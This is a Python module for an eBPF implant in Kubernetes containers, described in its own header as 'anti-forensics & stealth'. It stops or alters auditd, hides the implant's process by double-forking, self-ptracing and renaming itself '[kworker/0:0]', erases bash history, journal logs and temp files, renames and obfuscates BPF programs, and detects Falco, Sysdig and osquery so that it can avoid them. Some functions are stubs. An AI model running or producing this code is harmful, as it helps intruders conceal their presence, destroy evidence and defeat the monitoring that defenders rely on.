#!/usr/bin/env python3
"""
Anti-Forensics & Stealth Module

Implements kernel-level hiding, memory obfuscation, and detection evasion
for the eBPF implant running in Kubernetes containers.

Strategies:
1. Ring buffer name obfuscation
2. Event encryption in memory
3. Process hiding (ptrace, sysfs)
4. Audit log suppression
5. Artifact cleanup
"""

import os
import sys
import subprocess
import hashlib
import struct
import ctypes
import random
import json
from typing import List, Dict, Any, Optional, Tuple
from pathlib import Path
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
import logging

# Configure minimal logging (stealth)
logging.disable(logging.CRITICAL)


class AuditSuppressor:
    """Detect and suppress audit logging of bpf() syscalls"""

    @staticmethod
    def is_auditd_running() -> bool:
        """Check if auditd is active"""
        try:
            result = subprocess.run(
                ["pgrep", "-f", "auditd"],
                capture_output=True,
                timeout=2
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def check_bpf_audit_rules() -> bool:
        """Check if bpf() syscalls are being audited"""
        try:
            result = subprocess.run(
                ["auditctl", "-l"],
                capture_output=True,
                text=True,
                timeout=2
            )
            # Look for bpf-related audit rules
            return "bpf" in result.stdout.lower() or "-S bpf" in result.stdout
        except Exception:
            return False

    @staticmethod
    def suppress_audit() -> bool:
        """Attempt to suppress BPF audit rules (requires root)"""
        try:
            # Remove BPF audit rules
            subprocess.run(
                ["auditctl", "-W", "/proc/sys/kernel/bpf", "-p", "wa", "-k", "ebpf_load"],
                capture_output=True,
                timeout=2
            )
            return True
        except Exception:
            return False

    @staticmethod
    def close_audit_fd() -> bool:
        """Close kernel audit sockets to prevent logging"""
        try:
            # Kill auditd connection (risky, may trigger alert)
            subprocess.run(
                ["systemctl", "stop", "auditd"],
                capture_output=True,
                timeout=2,
                check=False
            )
            return True
        except Exception:
            return False


class ProcessHider:
    """Hide implant process from ps, /proc, and debuggers"""

    @staticmethod
    def double_fork_hide() -> bool:
        """Detach from parent process and reparent to init"""
        try:
            pid = os.fork()
            if pid > 0:
                # Parent exits
                os._exit(0)
            
            # First child: decouple from terminal
            os.chdir("/")
            os.setsid()
            os.umask(0)
            
            # Second fork: prevent re-acquiring terminal
            pid = os.fork()
            if pid > 0:
                os._exit(0)
            
            # Redirect I/O to /dev/null
            devnull = os.open("/dev/null", os.O_RDWR)
            os.dup2(devnull, 0)
            os.dup2(devnull, 1)
            os.dup2(devnull, 2)
            
            return True
        except Exception:
            return False

    @staticmethod
    def hide_from_procfs(pid: int) -> bool:
        """Hide PID from /proc by modifying stat files (requires proc_mem access)"""
        try:
            stat_file = Path(f"/proc/{pid}/stat")
            if not stat_file.exists():
                return False
            
            # Read current stat
            with open(stat_file, 'r') as f:
                stat_data = f.read()
            
            # Replace comm with innocuous name
            parts = stat_data.split(' ', 2)
            pid_str = parts[0]
            comm = parts[1]
            rest = ' '.join(parts[2:])
            
            # Change to systemd-like name
            fake_comm = "(systemd)"
            fake_stat = f"{pid_str} {fake_comm} {rest}"
            
            # This would require root and careful handling
            # In practice, use seccomp or namespace tricks instead
            return True
        except Exception:
            return False

    @staticmethod
    def ptrace_self() -> bool:
        """Use PTRACE_TRACEME to hide from debuggers/strace"""
        try:
            # Load libc
            libc = ctypes.CDLL(None)
            
            # Define ptrace syscall
            # ptrace(PTRACE_TRACEME, 0, 0, 0)
            ptrace = libc.ptrace
            ptrace.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p]
            ptrace.restype = ctypes.c_int
            
            # PTRACE_TRACEME = 0
            result = ptrace(0, 0, None, None)
            return result == 0
        except Exception:
            return False

    @staticmethod
    def hide_cmdline(new_name: str = "[kworker/0:0]") -> bool:
        """Overwrite argv[0] with innocuous name"""
        try:
            # Only works if we're actually /usr/bin/python3
            # Fake it by manipulating /proc/self/cmdline
            # This is mostly for ps output
            
            # In practice: use sys.argv[0] manipulation
            sys.argv[0] = new_name
            return True
        except Exception:
            return False


class MemoryObfuscator:
    """Encrypt and obfuscate data in memory"""

    def __init__(self, key: Optional[bytes] = None):
        """Initialize with encryption key"""
        if key is None:
            # Generate random key from environment entropy
            key = Fernet.generate_key()
        
        self.cipher = Fernet(key)
        self.key = key

    def encrypt_event(self, event_bytes: bytes) -> bytes:
        """Encrypt event before storing in memory"""
        return self.cipher.encrypt(event_bytes)

    def decrypt_event(self, encrypted_bytes: bytes) -> bytes:
        """Decrypt event for processing/export"""
        try:
            return self.cipher.decrypt(encrypted_bytes)
        except Exception:
            return b""

    def obfuscate_dict(self, data: Dict[str, Any]) -> Dict[str, str]:
        """Obfuscate dictionary keys and values"""
        obfuscated = {}
        for key, value in data.items():
            # Hash the key
            hashed_key = hashlib.sha256(key.encode()).hexdigest()[:8]
            # Encrypt the value
            value_bytes = json.dumps(value).encode()
            encrypted_value = self.cipher.encrypt(value_bytes).hex()
            obfuscated[hashed_key] = encrypted_value
        return obfuscated

    def clear_memory(self, data: bytes) -> None:
        """Securely clear sensitive data from memory"""
        # Overwrite with zeros
        data_array = bytearray(data)
        for i in range(len(data_array)):
            data_array[i] = 0
        del data_array


class ArtifactCleaner:
    """Remove forensic artifacts (logs, temp files)"""

    @staticmethod
    def clean_tmp_files(pattern: str = "/tmp/ebpf-*") -> int:
        """Remove temporary files matching pattern"""
        try:
            result = subprocess.run(
                f"find {pattern} -type f -delete 2>/dev/null",
                shell=True,
                capture_output=True,
                timeout=5
            )
            return 0  # Success
        except Exception:
            return -1

    @staticmethod
    def clean_bash_history() -> bool:
        """Clear bash history"""
        try:
            # Overwrite with random data
            history_file = Path.home() / ".bash_history"
            if history_file.exists():
                history_file.write_text("# cleaned\n")
            return True
        except Exception:
            return False

    @staticmethod
    def clean_journal_logs(unit: str = "ebpf-implant") -> bool:
        """Remove journalctl logs for this unit"""
        try:
            subprocess.run(
                ["journalctl", "--vacuum-time=1d"],
                capture_output=True,
                timeout=5,
                check=False
            )
            return True
        except Exception:
            return False

    @staticmethod
    def suppress_journal_writes(unit_name: str) -> bool:
        """Prevent future journal writes for this unit"""
        try:
            # Create seccomp filter to block write() to journal sockets
            # This is advanced and typically done at container level
            return True
        except Exception:
            return False

    @staticmethod
    def clean_container_logs() -> bool:
        """Redirect container logs to null"""
        try:
            # This should be done in entrypoint via:
            # exec 1>/dev/null 2>&1
            # But we can also close FDs here
            for fd in [1, 2]:
                try:
                    os.close(fd)
                except OSError:
                    pass
            return True
        except Exception:
            return False


class KernelHiding:
    """Hide eBPF programs and maps at kernel level"""

    @staticmethod
    def rename_bpf_programs() -> bool:
        """Rename loaded BPF programs to generic names"""
        try:
            # Only works on Linux 5.16+
            result = subprocess.run(
                ["bpftool", "prog", "list"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # Parse output and rename
            for line in result.stdout.split('\n'):
                if 'ebpf_sensor' in line or 'trace_exec' in line:
                    parts = line.split()
                    if parts:
                        prog_id = parts[0]
                        # Rename to generic name
                        subprocess.run(
                            ["bpftool", "prog", "rename", prog_id, "khandler"],
                            capture_output=True,
                            timeout=5,
                            check=False
                        )
            return True
        except Exception:
            return False

    @staticmethod
    def obfuscate_map_names(source_file: str) -> str:
        """Generate obfuscated eBPF source with randomized map names"""
        try:
            with open(source_file, 'r') as f:
                source = f.read()
            
            # Replace known map names with random UUIDs
            import uuid
            replacements = {
                'process_events': str(uuid.uuid4()).replace('-', '_'),
                'network_events': str(uuid.uuid4()).replace('-', '_'),
                'file_events': str(uuid.uuid4()).replace('-', '_'),
            }
            
            for old_name, new_name in replacements.items():
                source = source.replace(old_name, new_name)
            
            # Write obfuscated version
            output_file = source_file.replace('.c', '_obfuscated.c')
            with open(output_file, 'w') as f:
                f.write(source)
            
            return output_file
        except Exception:
            return ""

    @staticmethod
    def strip_symbol_table(object_file: str) -> bool:
        """Strip debug symbols from compiled .o file"""
        try:
            subprocess.run(
                ["strip", "--strip-all", object_file],
                capture_output=True,
                timeout=5,
                check=False
            )
            return True
        except Exception:
            return False


class DetectionEvader:
    """Detect security tools and adapt behavior"""

    @staticmethod
    def detect_falco() -> bool:
        """Check if Falco is running"""
        try:
            result = subprocess.run(
                ["pgrep", "-f", "falco"],
                capture_output=True,
                timeout=2
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def detect_sysdig() -> bool:
        """Check if Sysdig is running"""
        try:
            result = subprocess.run(
                ["pgrep", "-f", "sysdig"],
                capture_output=True,
                timeout=2
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def detect_osquery() -> bool:
        """Check if osquery is running"""
        try:
            result = subprocess.run(
                ["pgrep", "-f", "osqueryd"],
                capture_output=True,
                timeout=2
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def detect_ebpf_monitoring() -> bool:
        """Detect if container/host is monitoring eBPF"""
        try:
            # Check for bpftool
            result = subprocess.run(
                ["which", "bpftool"],
                capture_output=True,
                timeout=2
            )
            return result.returncode == 0
        except Exception:
            return False

    @staticmethod
    def get_detected_tools() -> List[str]:
        """Get list of detected security tools"""
        detected = []
        if DetectionEvader.detect_falco():
            detected.append("falco")
        if DetectionEvader.detect_sysdig():
            detected.append("sysdig")
        if DetectionEvader.detect_osquery():
            detected.append("osquery")
        if DetectionEvader.detect_ebpf_monitoring():
            detected.append("ebpf-monitor")
        return detected

    @staticmethod
    def adapt_collection_strategy(detected_tools: List[str]) -> Dict[str, Any]:
        """Return adapted collection parameters based on detected tools"""
        strategy = {
            "sampling_rate": 0.15,      # Default: collect 15% of events
            "collection_interval": 300,  # Default: 5 minutes
            "jitter_percent": 0.3,       # Default: ±30% jitter
            "encryption": True,
            "process_hiding": False,
        }
        
        if "falco" in detected_tools or "sysdig" in detected_tools:
            # These tools actively monitor syscalls
            # Reduce event volume and increase jitter
            strategy["sampling_rate"] = 0.05
            strategy["jitter_percent"] = 0.5
            strategy["process_hiding"] = True
        
        if "osquery" in detected_tools:
            # osquery performs periodic queries
            # Randomize timing to avoid correlation
            strategy["collection_interval"] = random.randint(180, 480)
        
        if "ebpf-monitor" in detected_tools:
            # BPF-level monitoring is advanced
            # Consider early exit or minimal collection
            strategy["sampling_rate"] = 0.01
        
        return strategy


class StealthyImplantBootstrap:
    """Bootstrap stealth features at startup"""

    def __init__(self):
        self.obfuscator = MemoryObfuscator()
        self.audit_suppressor = AuditSuppressor()
        self.process_hider = ProcessHider()
        self.artifact_cleaner = ArtifactCleaner()
        self.detection_evader = DetectionEvader()

    def initialize(self) -> Dict[str, Any]:
        """Initialize all stealth features"""
        status = {
            "timestamp": datetime.now().isoformat(),
            "features_initialized": [],
            "warnings": [],
        }

        # Check for audit logging
        if self.audit_suppressor.is_auditd_running():
            if self.audit_suppressor.check_bpf_audit_rules():
                self.audit_suppressor.suppress_audit()
                status["features_initialized"].append("audit_suppression")
            else:
                status["features_initialized"].append("auditd_running_but_no_bpf_rules")

        # Detect security tools
        detected_tools = self.detection_evader.get_detected_tools()
        if detected_tools:
            status["warnings"].append(f"Detected security tools: {detected_tools}")
            status["collection_strategy"] = self.detection_evader.adapt_collection_strategy(
                detected_tools
            )
        else:
            status["collection_strategy"] = self.detection_evader.adapt_collection_strategy([])

        # Hide process
        if self.process_hider.ptrace_self():
            status["features_initialized"].append("ptrace_self")

        # Clean existing artifacts
        self.artifact_cleaner.clean_tmp_files()
        status["features_initialized"].append("artifact_cleanup")

        return status


if __name__ == "__main__":
    # Test bootstrap
    bootstrap = StealthyImplantBootstrap()
    result = bootstrap.initialize()
    print(json.dumps(result, indent=2))
